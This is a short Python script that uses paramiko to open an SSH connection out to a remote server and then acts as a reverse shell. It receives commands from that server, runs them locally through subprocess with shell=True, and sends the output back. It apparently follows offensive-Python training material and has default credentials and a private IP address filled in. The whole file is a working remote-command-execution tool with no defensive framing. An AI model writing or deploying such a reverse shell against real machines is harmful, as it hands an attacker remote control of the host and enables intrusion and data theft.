# =-= utf-8 =-= #

import paramiko
import shlex
import subprocess


def ssh_command(hostname, server_port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname=hostname, port=server_port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())

        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == "exit":
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or b"okey")
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
        return


if __name__ == "__main__":
    import getpass

    username = input("Username: ") or "tim"
    password = getpass.getpass() or "pass"
    Hostname = input("Hostname: ") or "192.168.58.1"
    Server_port = input("Server Port or <CR>: ") or "2222"
    ssh_command(Hostname, Server_port, username, password, "ClientConnected")
